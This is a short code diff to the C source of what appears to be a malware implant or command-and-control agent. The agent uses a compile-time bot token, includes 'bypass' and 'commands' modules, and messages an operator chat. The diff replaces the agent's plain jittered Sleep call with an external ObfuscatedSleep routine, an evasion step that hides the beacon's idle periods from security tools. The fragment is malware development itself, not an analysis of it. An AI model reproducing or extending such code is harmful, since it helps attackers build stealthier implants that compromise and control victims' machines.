@@ -38,6 +38,8 @@
 #include "src/bypass.h"
 #include "src/commands.h"
 
+extern VOID ObfuscatedSleep(DWORD dwMilliseconds);
+
 /* ── Compile-time agent config (set by -D flags) ─────────────────────────── */
 #ifndef FITNAH_BOT_TOKEN
 #  error "FITNAH_BOT_TOKEN must be defined at compile time"
@@ -72,7 +74,7 @@ static void sleep_jittered(void) {
     int hi    = g_sleep + delta;
     if (lo < 1) lo = 1;
     int ms = (lo + (rand() % (hi - lo + 1))) * 1000;
-    Sleep(ms);
+    ObfuscatedSleep(ms);
 }
 
 /* ── Send a text message to the operator chat ────────────────────────────── */
